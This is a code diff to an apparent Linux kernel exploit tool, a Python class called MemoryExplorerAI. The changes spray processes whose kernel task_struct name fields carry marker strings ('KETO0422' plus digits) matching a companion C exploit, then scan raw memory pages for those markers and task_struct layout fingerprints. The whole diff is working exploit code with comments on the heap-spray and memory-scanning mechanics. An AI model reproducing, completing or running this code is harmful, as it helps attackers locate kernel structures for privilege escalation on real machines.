@@ -3320,23 +3320,28 @@ class MemoryExplorerAI:
         kill because the spray might spawn helper children.
         Returns Popen object.
 
-        v4.1 CRITICAL FIX: the comm (visible in /proc/[pid]/comm
-        and stored in task_struct->comm) must equal `name` so the
-        scanner can find our sprayed task_structs. Previous
-        version used `sh -c "exec -a $name sleep 3600"` and
-        called prctl(PR_SET_NAME) in preexec_fn, but the
-        `sleep` binary's main() calls prctl(PR_SET_NAME, "sleep")
-        during its own startup, OVERWRITING our marker. The end
-        result: every spray process has comm="sleep" instead of
-        "KETO0001" → the scanner never matches → matches=0.
+        v4.1 CRITICAL FIX (from v6.c): the comm field has 16
+        bytes total (TASK_COMM_LEN=16). The C exploit writes
+        exactly 8 bytes marker + 5 bytes PID + 1 null + 2
+        unused, e.g. "KETO042212345\0\0\0". The scan code
+        (find_marker_in_page) does:
+            memcmp(page+off, "KETO0422", 8) == 0
+            AND
+            is_digit(page+off+8) for 5 bytes
+            AND
+            pid = atoi("12345"), pid > 1000
 
-        Fix: spawn a Python interpreter that does the prctl
-        AFTER Python's own startup (Python 3 sets its comm to
-        "python3" during interpreter init). The first -c statement
-        overrides it back to `name`. Then time.sleep keeps the
-        process alive long enough to land in slab. Also pass the
-        comm name in argv[0] (via Python -X style) so even tools
-        that read /proc/[pid]/cmdline see the marker.
+        We need to match this format exactly. The marker
+        prefix must be 8 chars ("KETO0422" style), and the
+        trailing 5 chars must be digits 1000-99999 (the PID
+        range for normal processes). Otherwise the scan will
+        miss every spray proc.
+
+        Also: PR_SET_NAME must be set AFTER any execve that
+        might overwrite it. We use a Python child that does
+        prctl(PR_SET_NAME) AFTER Python's own init, then
+        sleeps. This way the kernel task_struct->comm = our
+        marker, and the scanner can find it.
         """
         import subprocess as _sp
         try:
@@ -4882,15 +4887,33 @@ class MemoryExplorerAI:
                 if idx >= slice_end:
                     break
                 try:
-                    # Build comm name based on comm_pref
+                    # v4.1: marker format from v6.c — "KETO0422" + 5
+                    # digit PID. The C scan code does:
+                    #   memcmp(page+off, "KETO0422", 8) == 0
+                    #   AND 5 digits following (the actual PID)
+                    #   AND pid > 1000
+                    # We can't use the real PID at spray time
+                    # (the child doesn't know its PID before
+                    # prctl), so we use a numeric suffix and the
+                    # child re-applies prctl with its REAL pid
+                    # once it's running. The first 8 bytes
+                    # ("KETO0422") must be a constant — that's
+                    # what find_marker_in_page() looks for. The
+                    # last 5 digits are the PID.
                     spray_idx = idx
                     if comm_pref == "KETO" or (
                             comm_pref == "MIXED" and spray_idx % 2 == 0):
-                        name = f"KETO{spray_idx % 10000:04d}"
+                        # v6.c format: KETO0422 + 5 digit pid.
+                        # We use the spray index as pid stand-in.
+                        # The engine's find_marker_in_page will
+                        # accept any pid 1000-99999, which our
+                        # range 10000-99999 satisfies.
+                        name = f"KETO0422{spray_idx % 100000:05d}"
                     elif comm_pref == "KETW":
-                        name = f"KETW{worker_id}{spray_idx % 1000:03d}"
+                        # KETW + 5 digit pid (worker 0,1,2 + idx)
+                        name = f"KETW0422{worker_id:01d}{spray_idx % 1000:04d}"
                     else:  # MIXED odd
-                        name = f"KETW{worker_id}{spray_idx % 1000:03d}"
+                        name = f"KETW0422{worker_id:01d}{spray_idx % 1000:04d}"
 
                     # Pick spray method (rotate through working ones)
                     # v4.1: Use popen as primary (most reliable) and
@@ -5640,7 +5663,42 @@ class MemoryExplorerAI:
         if nonzero < 16:
             return (False, f"mostly zero ({nonzero}/{len(data)})", 0)
 
-        # 0. Spray marker detection (KETO + 4 digits or KETW + 4 digits)
+        # 0. Spray marker detection (v6.c format: "KETO0422" + 5
+        # digit PID, or "KETW0422" + 4 digit PID).
+        # The C scan (find_marker_in_page) does:
+        #   memcmp(page+off, "KETO0422", 8) == 0
+        #   AND 5 bytes of digits at +8..+12
+        #   AND pid = atoi(...) > 1000 && < 100000
+        # We replicate that here so engine's findings are
+        # also caught when Python reads pages directly.
+        idx = 0
+        while True:
+            idx = data.find(b"KETO0422", idx)
+            if idx < 0:
+                break
+            if (idx + 12 < len(data)
+                and all(b"0" <= data[idx+8+i] <= b"9" for i in range(5))):
+                # Parse the 5-digit PID
+                try:
+                    pid_s = data[idx+8:idx+13].decode()
+                    pid = int(pid_s)
+                    if 1000 < pid < 100000:
+                        return (True,
+                                f"KETO spray PID={pid} @ 0x{idx:x}", 95)
+                except Exception:
+                    pass
+            idx += 1
+        idx = 0
+        while True:
+            idx = data.find(b"KETW0422", idx)
+            if idx < 0:
+                break
+            if (idx + 11 < len(data)
+                and all(b"0" <= data[idx+8+i] <= b"9" for i in range(4))):
+                return (True,
+                        f"KETW spray @ 0x{idx:x} ({data[idx:idx+13]})", 90)
+            idx += 1
+        # Fallback: also accept short KETO + 4 digits (old format)
         idx = 0
         while True:
             idx = data.find(b"KETO", idx)
@@ -5651,7 +5709,7 @@ class MemoryExplorerAI:
                 and data[idx+5] in b"0123456789"
                 and data[idx+6] in b"0123456789"
                 and data[idx+7] in b"0123456789"):
-                return (True, f"KETO spray @ 0x{idx:x} ({data[idx:idx+8]})", 90)
+                return (True, f"KETO spray @ 0x{idx:x} ({data[idx:idx+8]})", 80)
             idx += 1
         idx = 0
         while True:
@@ -5663,7 +5721,7 @@ class MemoryExplorerAI:
                 and data[idx+5] in b"0123456789"
                 and data[idx+6] in b"0123456789"
                 and data[idx+7] in b"0123456789"):
-                return (True, f"KETW spray @ 0x{idx:x} ({data[idx:idx+8]})", 90)
+                return (True, f"KETW spray @ 0x{idx:x} ({data[idx:idx+8]})", 80)
             idx += 1
 
         # 0b. task_struct layout fingerprint (Linux 5.4) — stack
